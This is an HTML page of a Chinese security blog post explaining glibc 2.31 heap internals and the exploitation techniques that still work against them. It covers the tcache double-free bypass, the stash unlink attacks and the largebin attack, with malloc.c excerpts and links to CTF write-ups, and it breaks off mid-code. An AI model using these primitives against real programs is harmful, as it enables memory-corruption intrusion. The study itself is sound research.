@@ -1,0 +1,299 @@
+
+
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="UTF-8"/>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="renderer" content="webkit">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta name="apple-mobile-web-app-status-bar-style" content="black">
+	<meta name="description" content="">
+
+	
+		
+			<link rel="stylesheet" href="/bower_components/fancybox/source/jquery.fancybox.css">
+		
+		<link rel="stylesheet" href="/bower_components/font-awesome/css/font-awesome.min.css">
+		<link rel="stylesheet" href="/css/style.css">
+	
+
+	<title>Research Blog - 星阑科技安全研究组技术博客</title>
+<meta name="generator" content="Hexo 4.2.1"></head>
+<body>
+<header id="header">
+	<div class="center">
+		<div class="wrap">
+			<div id="site">
+				<h1>
+					<a href="/">Research Blog</a>
+					
+						<a class="github" href="https://github.com/Starcross-tech" target="_blank" rel="noopener">
+	  					<svg aria-hidden="true" class="octicon octicon-mark-github" height="28" role="img" version="1.1" viewBox="0 0 16 16" width="28"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59 0.4 0.07 0.55-0.17 0.55-0.38 0-0.19-0.01-0.82-0.01-1.49-2.01 0.37-2.53-0.49-2.69-0.94-0.09-0.23-0.48-0.94-0.82-1.13-0.28-0.15-0.68-0.52-0.01-0.53 0.63-0.01 1.08 0.58 1.23 0.82 0.72 1.21 1.87 0.87 2.33 0.66 0.07-0.52 0.28-0.87 0.51-1.07-1.78-0.2-3.64-0.89-3.64-3.95 0-0.87 0.31-1.59 0.82-2.15-0.08-0.2-0.36-1.02 0.08-2.12 0 0 0.67-0.21 2.2 0.82 0.64-0.18 1.32-0.27 2-0.27 0.68 0 1.36 0.09 2 0.27 1.53-1.04 2.2-0.82 2.2-0.82 0.44 1.1 0.16 1.92 0.08 2.12 0.51 0.56 0.82 1.27 0.82 2.15 0 3.07-1.87 3.75-3.65 3.95 0.29 0.25 0.54 0.73 0.54 1.48 0 1.07-0.01 1.93-0.01 2.2 0 0.21 0.15 0.46 0.55 0.38C13.71 14.53 16 11.53 16 8 16 3.58 12.42 0 8 0z"></path></svg>
+						</a>
+					
+				</h1>
+				
+					<h2>
+						<a href="/">星阑科技安全研究组技术博客</a>
+					</h2>
+				
+			</div>
+			<nav id="menu">
+				<ul>
+					
+						<li><a href="/">首页</a></li>
+					
+						<li><a href="/archives/">归档</a></li>
+					
+						<li><a href="/news">最新</a></li>
+					
+						<li><a href="/about">关于</a></li>
+					
+				</ul>
+			</nav>
+		</div>
+	</div>
+</header>
+
+<div id="content">
+	<div class="center">
+		<div class="main-col">
+			
+
+	
+		
+		<article class="post">
+	<div class="post-content">
+		<header>
+			
+				<div class="meta">
+					<div class="icon">
+						
+							<i class="fa fa-file"></i>
+						
+					</div>
+					<time datetime="2020-05-21T07:00:00.000Z">2020-05-21</time>
+				</div>
+			
+			
+	
+		<h1 class="title" data-role="articleTitle"><a href="/2020/05/21/heap%20exploit%20231/">Heap Exploit v2.31</a></h1>
+	
+
+		</header>
+		<div class="entry">
+			
+				<p>本文作者：<strong>t1an5t@StarCross</strong></p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>截至目前，linux的glibc最新版本为2.31，相对于旧版本，安全保护做得更加完善。所以，总结一些相对较新的安全机制，以及对应可操作的glibc heap利用技巧，可以有效针对最新的2.31版本的glibc，当然，基本上也可以通杀掉之前的其他版本带tcache的glibc。</p>
+<h2 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h2><h3 id="变动"><a href="#变动" class="headerlink" title="变动"></a>变动</h3><p>首先，为了增加安全性，2.29版本以后的tcache_entry结构体发生了变化，增加了key字段。</p>
+<p>其结构体变成了</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>
+
+<p>且在free的时候多了一段检测</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache))</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *tmp;</span><br><span class="line">    LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">    <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">         tmp;</span><br><span class="line">         tmp = tmp-&gt;next)</span><br><span class="line">        <span class="keyword">if</span> (tmp == e)</span><br><span class="line">            malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span><br><span class="line">    <span class="comment">/* If we get here, it was a coincidence.  We've wasted a</span></span><br><span class="line"><span class="comment">	       few cycles, but don't abort.  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之后在tcache_put函数中：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">    tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">    e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">    e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">    tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">    ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>整个流程为：调用tcache_put放入tcache_entry的时候，其next指针和之前变化一致，但是其key字段指向了tcache。然后free的时候会检测key字段是否为tcache，相等则检测free的指针值是否在对应的tcache_entry链上，如果在则视为程序在double free，进而终止程序。<strong>这里为什么逻辑不是key等于tcache直接中断，应该是考虑了用户放在key字段的数据恰好为tcache值的情况。</strong></p>
+<p>这种简单的方法使得之前的tcache非常随意的double free失效了。不过绕过的方式也非常简单，即在构造double free时提前修改key字段的值为任意其他的值即可。所以相关的所有攻击手法依然可用，不过增加了能够修改key字段的前提。</p>
+<p>还有一个变动就是tcache本身的结构体发生了变化：</p>
+<p>counts字段由原来的一字节变成了现在的两字节。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">    tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure>
+
+<p>我也不清楚这么变化的目的。不过这使得一些分析堆利用的gdb插件解析出现了一定的错误。</p>
+<h2 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h2><p>fastbin与tcache之间存在一种新的stash的机制：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">		 stash them in the tcache.  */</span></span><br><span class="line"><span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line"><span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">    mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">    <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">           &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">            *fb = tc_victim-&gt;fd;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>也就是说当从fastbin里取chunk时，其余的chunk会被依次放入对应的tcache中，终止条件时fastbin链为空或者tcache装满。</p>
+<p>其余没什么变动，要注意做fastbin相关利用的时候要先填满对应的tcache_entry链。</p>
+<hr>
+<h2 id="smallbin"><a href="#smallbin" class="headerlink" title="smallbin"></a>smallbin</h2><p>tcache与smallbin之间也增加了stash的过程，即向smallbin申请的时候，这条smallbin链中其余chunk会被放到对应size的tcache_entry链中。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line"><span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">    mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">    <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">           &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            bck = tc_victim-&gt;bk;</span><br><span class="line">            set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                set_non_main_arena (tc_victim);</span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">            tcache_put (tc_victim, tc_idx);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h3 id="tcache-stash-unlink"><a href="#tcache-stash-unlink" class="headerlink" title="tcache stash unlink"></a>tcache stash unlink</h3><p>这种smallbin解链方式类似于远古版本的无检测unlink，由此也产生了新的利用方式，目前适用于所有带tcache的glibc版本。</p>
+<p>攻击的前提就是<strong>得到堆地址，且可以修改smallbin中chunk的bk字段</strong>，这里针对不同情况，可以实现三种效果：</p>
+<p><strong>Tcache stash unlink attack</strong>，可以实现等价于unsortedbin的作用，即向任意地址写入一个不可控的大数字。其最核心操作，就是先放入2个chunk到smallbin，6个chunk到对应的tcache。之后在不破坏fd的情况下将后放入smallbin的chunk的bk设置为目标地址-0x10。这样当再向smallbin申请对应size的chunk时（一般用calloc，因为calloc不请求tcache），先放入smallbin的chunk被分配给用户，然后触发stash机制。bck = tc_victim-&gt;bk; 此时的bck就是目标地址-0x10，之后  bck-&gt;fd = bin; 也就是*(目标地址-0x10+0x10) = bin，这样就实现了等价于unsortedbin的操作。之后调用tcache_put把后放入smallbin的chunk取出给对应的tcache，因为tcache之前已经被布置了6个chunk，这次put后达到了阈值，所以也就退出了这次stash循环，整个流程就可以正常结束了。</p>
+<p><strong>对应题目：</strong>HITCON2019-one_punch_man</p>
+<p><strong>WP：</strong><a href="https://medium.com/@ktecv2000/hitcon-ctf-2019-quals-one-punch-man-pwn-292pts-3e94eb3fd312" target="_blank" rel="noopener">https://medium.com/@ktecv2000/hitcon-ctf-2019-quals-one-punch-man-pwn-292pts-3e94eb3fd312</a></p>
+<hr>
+<p><strong>Tcache stash unlink attack+</strong>，可以实现任意地址的分配，和上述布局大致相同，不过有细微差异，放入2个chunk到smallbin，5个chunk到对应的tcache，后在不破坏fd的情况下将后放入smallbin的chunk的bk设置为目标地址-0x10。同时要令目标地址+8中的值是一个指向一处可写内存的指针。之后来到stash机制之后，后放入smallbin的chunk被放入tcache，此时的bin-&gt;bk就是目标地址-0x10，相当于把目标地址-0x10的指针链接进了smallbin中。之后不满足终止条件，会进行下一次的stash，这时的tc_victim就是目标地址，之后为了令bck = tc_victim-&gt;bk;  bck-&gt;fd = bin; 能够正常运行，所以之前才需要令目标地址+8中的值是一个指向一处可写内存的指针。之后目标地址就会被放入tcache_entry的头部，stash满足终止条件而终止。</p>
+<p><strong>对应题目：</strong>HITCON2019-lazyhouse</p>
+<p><strong>WP：</strong><a href="https://github.com/scwuaptx/CTF/blob/master/2019-writeup/hitcon/lazyhouse.py" target="_blank" rel="noopener">https://github.com/scwuaptx/CTF/blob/master/2019-writeup/hitcon/lazyhouse.py</a></p>
+<hr>
+<p><strong>Tcache stash unlink attack++</strong>，可以同时实现上述两种功能，基于上述的第二种方法进行稍微的调整即可，也就是smallbin里的bk设置为目标地址1-0x10，将目标地址1+8的位置设置为目标地址2-0x10。这样就可以令tcache分配到目标地址1，同时向目标地址2写入一个大数字。</p>
+<p><strong>对应题目：</strong>XCTF-GXZY2020-twochunk</p>
+<p><strong>WP：</strong><a href="https://sh1ner.github.io/2020/03/10/gxzyctf2020-twochunk/" target="_blank" rel="noopener">https://sh1ner.github.io/2020/03/10/gxzyctf2020-twochunk/</a></p>
+<hr>
+<h2 id="largebin"><a href="#largebin" class="headerlink" title="largebin"></a>largebin</h2><p>因为largebin链里面的chunksize是可以不相同的，所以largebin维护其关系的双向链表有两种形式来进行维护。源代码比较复杂，网上的资料有详细讲解，但是介绍的都并不直观或者不完全正确。</p>
+<p>所以这里用C代码和布局展示，以图片的形式来观察largebin的布局方式。</p>
+<hr>
+<h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc ./test.c -o test -no-pie -g -O0</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *p1, *p2, *p3, *p4, *p5, *p6, *p7, *p8, *p9;</span><br><span class="line"></span><br><span class="line">	p1 = <span class="built_in">malloc</span>(<span class="number">0x440</span>);<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	p2 = <span class="built_in">malloc</span>(<span class="number">0x450</span>);<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	p3 = <span class="built_in">malloc</span>(<span class="number">0x460</span>);<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">	p4 = <span class="built_in">malloc</span>(<span class="number">0x440</span>);<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	p5 = <span class="built_in">malloc</span>(<span class="number">0x450</span>);<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	p6 = <span class="built_in">malloc</span>(<span class="number">0x460</span>);<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	</span><br><span class="line">	p7 = <span class="built_in">malloc</span>(<span class="number">0x440</span>);<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	p8 = <span class="built_in">malloc</span>(<span class="number">0x450</span>);<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">	p9 = <span class="built_in">malloc</span>(<span class="number">0x460</span>);<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(p1);<span class="built_in">free</span>(p2);<span class="built_in">free</span>(p3);</span><br><span class="line">	<span class="built_in">free</span>(p4);<span class="built_in">free</span>(p5);<span class="built_in">free</span>(p6);</span><br><span class="line">	<span class="built_in">free</span>(p7);<span class="built_in">free</span>(p8);<span class="built_in">free</span>(p9);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// trigger</span></span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h3 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h3><p><img src="1581923610657.png" alt="1581923610657"></p>
+<hr>
+<h3 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h3><p>这里只画出了fd和fd_nextsize，bk和bk_nextsize反向指回去即可。</p>
+<p>largebin[1]的fd只会指向该大链中size最大的小链的第一个元素也就是idx3，largebin[1]的bk指向该大链中size最小的小链的最后一个元素也就是idx4。</p>
+<p>第一个放进该小链的chunk会被当做头部（带着fd/bk_nextsize的），只有每个小链的头部有fd/bk_nextsize，且均指向其他头部，fd_nextsize指向比自己size小的头部，bk_nextsize则指向比自己size大的头部。<strong>最小size的头部的fd_nextsize指向最大size的头部，最大size的头部bk_nextsize同理指向最小size的头部。</strong></p>
+<p><strong>提取规则：</strong></p>
+<p>沿着小链头部fd指向进行索引取出，最后才会取小链头部。比如以<code>idx2&lt;-&gt;idx8&lt;-&gt;idx5</code>这条链为例，第一次取的chunk为idx8，之后变成<code>idx2&lt;-&gt;idx5</code>，然后再取的chunk为idx5，最后才会取idx2。取idx2的时候，因为取完之后idx2的小链就空了，idx1的小链头部和idx3的小链头部fd/bk_nextsize部分会被重新构造为彼此链接。</p>
+<p><strong>插入规则：</strong></p>
+<p>第一个插入该小链的chunk会被当做头部（带着fd/bk_nextsize的），之后的链会类似于一种fastbins的感觉进行插入，比如我的测试代码里插入的顺序是idx2，idx5，idx8，idx2因为是第一个插入作为头部，idx5插入的时候会构成<code>idx2&lt;-&gt;idx5</code>，而idx8插入的时候会变成<code>idx2&lt;-&gt;idx8&lt;-&gt;idx5</code>。</p>
+<hr>
+<h3 id="largebin-attack"><a href="#largebin-attack" class="headerlink" title="largebin attack"></a>largebin attack</h3><p>largebin attack可以实现向指定地址写一个大数的效果。需要泄露libc地址以及堆地址，并可以覆盖bk_nextsize字段。</p>
+<p>发生在从unsortedbin链中解链并放入对应bin这个操作中，以2.29中的代码为例：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    victim_index = largebin_index (<span class="built_in">size</span>);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">        <span class="built_in">size</span> |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">        assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>)</span><br><span class="line">            &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">        &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            assert (chunk_main_arena (fwd));</span><br><span class="line">            <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">size</span> &lt; chunksize_nomask (fwd))</span><br><span class="line">            &#123;</span><br><span class="line">                fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                assert (chunk_main_arena (fwd));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">size</span></span><br><span class="line">                == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                fwd = fwd-&gt;fd;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            bck = fwd-&gt;bk;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在2.31以前的版本，largebin attack有两种操作方式。其核心思想就是借助二重指针的操作给了攻击者利用机会。两个可利用的操作分别发生在：</p>
+<p><a href="https://elixir.bootlin.com/glibc/glibc-2.29/source/malloc/malloc.c#L3860" target="_blank" rel="noopener">https://elixir.bootlin.com/glibc/glibc-2.29/source/malloc/malloc.c#L3860</a><br><a href="https://elixir.bootlin.com/glibc/glibc-2.29/source/malloc/malloc.c#L3880" target="_blank" rel="noopener">https://elixir.bootlin.com/glibc/glibc-2.29/source/malloc/malloc.c#L3880</a></p>
+<p>2.31后代码变成了：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    victim_index = largebin_index (<span class="built_in">size</span>);</span><br><span class="line">    bck = bin_at (av, victim_index);</span><br><span class="line">    fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">    <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">        <span class="built_in">size</span> |= PREV_INUSE;</span><br><span class="line">        <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">        assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span>)</span><br><span class="line">            &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">        &#123;</span><br><span class="line">            fwd = bck;</span><br><span class="line">            bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">            victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">            fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            assert (chunk_main_arena (fwd));</span><br><span class="line">            <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">size</span> &lt; chunksize_nomask (fwd))</span><br><span class="line">            &#123;</span><br><span class="line">                fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                assert (chunk_main_arena (fwd));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">size</span></span><br><span class="line">                == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                fwd = fwd-&gt;fd;</span><br><span class="line">            <span 